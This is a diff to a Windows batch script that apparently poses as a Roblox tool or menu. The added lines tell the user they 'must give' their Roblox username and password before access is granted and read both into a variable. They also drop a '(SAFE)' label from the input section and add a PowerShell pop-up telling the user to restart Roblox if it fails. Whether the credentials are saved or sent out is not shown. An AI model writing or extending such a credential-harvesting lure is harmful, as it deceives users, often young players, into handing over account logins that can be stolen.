@@ -6,14 +6,14 @@ pause
 echo hello %USERNAME%
 pause
 
-echo before any access is granted you must give your roblox password
+echo before any access is granted you must give your roblox password and username 
 pause
 
 :: =========================
-:: User Input (SAFE)
+:: User Input 
 :: =========================
 set "PASSWORD="
-set /p "PASSWORD=Enter your password: "
+set /p "PASSWORD=Enter your username and password: "
 
 :: =========================
 :: Create file
@@ -226,8 +226,11 @@ echo Placeholder menu...
 pause
 goto MAIN
 
+powershell -command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('if it does not work completly restart roblox')"
+
 :EXIT
 cls
 echo Exiting...
 timeout /t 1 >nul
 exit /b
+
